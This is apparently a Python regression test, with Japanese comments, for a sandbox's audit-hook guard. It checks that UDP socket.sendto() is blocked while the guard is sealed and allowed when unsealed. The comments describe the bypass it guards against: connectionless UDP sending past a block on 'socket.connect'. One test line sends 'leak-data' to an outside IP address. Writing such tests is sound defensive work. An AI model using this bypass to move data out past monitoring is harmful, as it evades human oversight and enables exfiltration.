import sys, os, socket
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import report_pass, report_fail, ROOT

NAME = "イェグディエルの封印網 (Jegudiel's Sealed Net - 深層保護のネットワーク送信迂回検知)"

# [新設 2026-10 §CA] 実際に発見した具体例: `maquina_gatekeeper.py`の
# `ultimate_audit_hook`("深層保護"、`sys.addaudithook`ベースの唯一の
# ランタイム防御層)は、ネットワーク通信を遮断する目的で"socket.connect"
# をforbidden集合に含めていた。しかしUDPの`socket.sendto()`は事前の
# `connect()`を一切必要とせずにデータを送信できるため、"socket.connect"
# というaudit eventを一度も発火させない。実機で確認済み:
# `set_sanctuary_sealed(True)`(深層保護が有効な状態)でも、
# `socket.sendto()`によるデータ送信が例外無しで素通りすることを確認
# した――封鎖中に外部へデータを持ち出す(exfiltration)経路が、
# "socket.connect"だけを遮断する実装では塞がれていなかった。
#
# [一般化の方針] §BW(`import os.path`による ast ベースのブロックリスト
# 回避)と同じ構造の欠陥――禁止したい意図(外部への通信・データ送信)は
# 同じなのに、別のAPIを使うだけで素通りしてしまう――だが、本件は
# AST静的解析ではなく`sys.addaudithook`ベースのランタイム監査フックが
# 対象であるため、`angels/remiel_equivalence_battery.py`の対象には
# 含まれていなかった。本天使は、個々のイベント名の列挙を解析するのでは
# なく、実際に`ultimate_audit_hook`を登録し、封鎖状態で既知のネットワーク
# 送信手段(UDPの`socket.sendto()`)を実際に発火させて、正しく遮断される
# ことを継続的に検証する回帰連戦である。
#
# [正直な注記: 本検査の限界] (1) 本天使が検証するのは「UDPの
# socket.sendto()による接続不要の送信」という既知の具体的な経路のみで
# あり、将来Pythonが新たに追加する別のネットワークAPI(現時点では未知)
# には自動的には及ばない。(2) TCP経由の`send`/`sendall`はPythonの
# audit event仕様上そもそも専用のイベントを持たず、必ず事前の`connect`
# (= forbidden集合で既に遮断されている)を要するため、本天使の検査対象
# には含めていない(実機で確認済みの、検査不要と判断した境界)。
# (3) 本天使が検証する深層保護は、本リポジトリ全体のゼロトラスト
# アーキテクチャの一層(defense in depth)に過ぎず、唯一の防衛線では
# ない――Docker等によるOSレベルのネットワーク隔離(`--network none`)が
# 一次防衛線であることは、本ファイルより前の`cassiels_veil`関連の
# GRIMOIRE記述(§L等)が既に明記している前提と同じである。

sys.path.insert(0, str(ROOT))


def _check_udp_sendto_is_blocked_while_sealed() -> tuple:
    """封鎖中にUDPのsendto()が正しく遮断されるかを確認する。
    戻り値: (success: bool, detail: str)"""
    import maquina_gatekeeper as mg

    mg._register_audit_hook_once()
    mg.set_sanctuary_sealed(True)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        try:
            s.sendto(b"leak-data", ("93.184.216.34", 12345))
            return False, "封鎖中にsocket.sendto()によるデータ送信が遮断されなかった"
        except mg.LossOfAtaraxia:
            return True, "OK"
    finally:
        mg.set_sanctuary_sealed(False)
        s.close()


def _check_udp_sendto_is_allowed_when_unsealed() -> tuple:
    """[誤検知防止] 封鎖していない通常時は、socket.sendto()が誤って
    遮断されないかを確認する。戻り値: (success: bool, detail: str)"""
    import maquina_gatekeeper as mg

    mg._register_audit_hook_once()
    if mg.is_sanctuary_sealed():
        return False, "前提条件の異常: 検査開始時点で既に封鎖状態になっている"
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        try:
            s.sendto(b"hello", ("127.0.0.1", 1))
        except OSError:
            # [正直な注記] ネットワーク到達性やサンドボックス環境の制約に
            # よるOSError(例: ポートの到達不能)は、本検査が確認したい
            # 「深層保護による誤遮断の有無」とは無関係なため、安全に
            # 無視する(mg.LossOfAtaraxiaのみを本当の検知対象とする)。
            pass
        except mg.LossOfAtaraxia:
            return False, "封鎖していないのにsocket.sendto()が誤って遮断された"
        return True, "OK"
    finally:
        s.close()


CHECKS = [
    ("maquina_gatekeeper.ultimate_audit_hook: UDP sendto遮断", _check_udp_sendto_is_blocked_while_sealed),
    ("maquina_gatekeeper.ultimate_audit_hook: 非封鎖時の誤検知防止", _check_udp_sendto_is_allowed_when_unsealed),
]


def run_battery():
    """`ultimate_audit_hook`に対し、既知のネットワーク送信迂回経路を
    実際に与えて、正しく処理されるかを確認する。
    戻り値: [(name, detail), ...] (失敗したものだけ)"""
    failures = []
    for name, check_fn in CHECKS:
        try:
            success, detail = check_fn()
        except Exception as e:
            failures.append((name, f"検査関数自体が例外を発生: {type(e).__name__}: {e}"))
            continue
        if not success:
            failures.append((name, detail))
    return failures


def main():
    failures = run_battery()
    if failures:
        detail = "; ".join(f"{n}({d})" for n, d in failures)
        report_fail(
            NAME,
            f"深層保護のネットワーク送信遮断に、少なくとも1つの既知の"
            f"迂回経路が再発しています(§CAの回帰): {detail}",
            evidence={"failures": failures},
        )
        return

    report_pass(
        NAME,
        "封鎖中のUDP sendto()による接続不要のデータ送信が正しく遮断され、"
        "かつ非封鎖時には誤って遮断されないことを確認しました。",
    )


if __name__ == "__main__":
    main()
